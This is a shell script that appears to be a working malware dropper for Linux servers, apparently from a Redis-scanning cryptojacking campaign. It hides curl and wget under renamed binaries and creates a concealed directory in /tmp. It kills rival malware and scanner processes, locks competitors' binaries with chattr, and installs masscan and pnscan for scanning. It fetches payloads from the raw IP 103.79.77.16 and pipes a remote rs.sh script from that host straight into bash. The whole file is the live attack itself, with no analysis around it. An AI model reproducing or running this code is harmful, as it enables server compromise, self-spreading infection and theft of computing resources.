#!/bin/sh
bbdir="/usr/bin/curl"
bbdira="/usr/bin/cd1"
ccdir="/usr/bin/wget"
ccdira="/usr/bin/wd1"
mv /usr/bin/curl /usr/bin/url
mv /usr/bin/url /usr/bin/cd1
mv /usr/bin/cur /usr/bin/cd1
mv /usr/bin/cdl /usr/bin/cd1
mv /usr/bin/cdt /usr/bin/cd1
mv /usr/bin/wget /usr/bin/get
mv /usr/bin/get /usr/bin/wd1
mv /usr/bin/wge /usr/bin/wd1
mv /usr/bin/wdl /usr/bin/wd1
mv /usr/bin/wdt /usr/bin/wd1
sleep $( seq 3 7 | sort -R | head -n1 )
cd /tmp || cd /var/tmp
sleep 1
mkdir -p .ice-unix/... && chmod -R 777 .ice-unix && cd .ice-unix/...
sleep 1
if [ -f .watch ]; then
rm -rf .watch
exit 0
fi
sleep 1
echo 1 > .watch
sleep 1
ps x | awk '!/awk/ && /redisscan|ebscan|redis-cli/ {print $1}' | xargs kill -9 2>/dev/null
ps x | awk '!/awk/ && /barad_agent|masscan|\.sr0|clay|udevs|\.sshd|xig/ {print $1}' | xargs kill -9 2>/dev/null
sleep 1
if [ -x "$(command -v apt-get)" ]; then
export DEBIAN_FRONTEND=noninteractive
apt-get update -y --exclude=procps* psmisc*
apt-get install -y debconf-doc
apt-get install -y build-essential
apt-get install -y libpcap0.8-dev libpcap0.8
apt-get install -y libpcap*
apt-get install -y make gcc git
apt-get install -y redis-server
apt-get install -y redis-tools
apt-get install -y redis
apt-get install -y iptables
apt-get install -y masscan
apt-get install -y unhide
fi
if [ -x "$(command -v yum)" ]; then
dnf config-manager --set-enabled PowerTools
dnf config-manager --set-enabled powertools
yum install -y epel-release
yum install -y git iptables make gcc redis libpcap libpcap-devel
yum install -y masscan
fi
sleep 1
echo "Software Installed"

dddir="/usr/sbin/unhide"
$dddir quick |grep PID:|awk '{print $4}'|xargs -I % kill -9 % 2>/dev/null
chattr -i /usr/bin/ip6network
chattr -i /usr/bin/kswaped
chattr -i /usr/bin/irqbalanced
chattr -i /usr/bin/rctlcli
chattr -i /usr/bin/systemd-network
chattr -i /usr/bin/pamdicks
echo 1 > /usr/bin/ip6network
echo 2 > /usr/bin/kswaped
echo 3 > /usr/bin/irqbalanced
echo 4 > /usr/bin/rctlcli
echo 5 > /usr/bin/systemd-network
echo 6 > /usr/bin/pamdicks
chattr +i /usr/bin/ip6network
chattr +i /usr/bin/kswaped
chattr +i /usr/bin/irqbalanced
chattr +i /usr/bin/rctlcli
chattr +i /usr/bin/systemd-network
chattr +i /usr/bin/pamdicks

downloads()
{
    if [ -f "/usr/bin/curl" ]
    then 
	echo $1,$2
        http_code=`curl -I -m 10 -o /dev/null -s -w %{http_code} $1`
        if [ "$http_code" -eq "200" ]
        then
            curl --connect-timeout 10 --retry 100 $1 > $2
        elif [ "$http_code" -eq "405" ]
        then
            curl --connect-timeout 10 --retry 100 $1 > $2
        else
            curl --connect-timeout 10 --retry 100 $3 > $2
        fi
    elif [ -f "/usr/bin/cd1" ]
    then
        http_code = `cd1 -I -m 10 -o /dev/null -s -w %{http_code} $1`
        if [ "$http_code" -eq "200" ]
        then
            cd1 --connect-timeout 10 --retry 100 $1 > $2
        elif [ "$http_code" -eq "405" ]
        then
            cd1 --connect-timeout 10 --retry 100 $1 > $2
        else
            cd1 --connect-timeout 10 --retry 100 $3 > $2
        fi
    elif [ -f "/usr/bin/wget" ]
    then
        wget --timeout=10 --tries=100 -O $2 $1
        if [ $? -ne 0 ]
	then
		wget --timeout=10 --tries=100 -O $2 $3
        fi
    elif [ -f "/usr/bin/wd1" ]
    then
        wd1 --timeout=10 --tries=100 -O $2 $1
        if [ $? -eq 0 ]
        then
            wd1 --timeout=10 --tries=100 -O $2 $3
        fi
    fi
}

if ! [ -x "$(command -v masscan)" ]; then
rm -rf /var/lib/apt/lists/*
rm -rf x1.tar.gz
sleep 1
$bbdira -sL -o x1.tar.gz http://103.79.77.16/b2f628fff19fda999999999/1.0.4.tar.gz
sleep 1
[ -f x1.tar.gz ] && tar zxf x1.tar.gz && cd masscan-1.0.4 && make && make install && cd .. && rm -rf masscan-1.0.4
echo "Masscan Installed"
fi
echo "Masscan Already Installed"
sleep 3 && rm -rf .watch
if ! ( [ -x /usr/local/bin/pnscan ] || [ -x /usr/bin/pnscan ] ); then
$bbdira -sL -o .x112 http://103.79.77.16/ep9TS2/pnscan.tar.gz || $ccdira -q -O .x112 http://103.79.77.16/ep9TS2/pnscan.tar.gz
sleep 1
[ -f .x112 ] && tar zxf .x112 && cd pnscan && ./configure && make && make install && cd .. && rm -rf pnscan .x112
echo "Pnscan Installed"
fi
echo "Pnscan Already Installed"

$bbdir -fsSL http://103.79.77.16/ep9TS2/rs.sh | bash
$bbdira -fsSL http://103.79.77.16/ep9TS2/rs.sh | bash
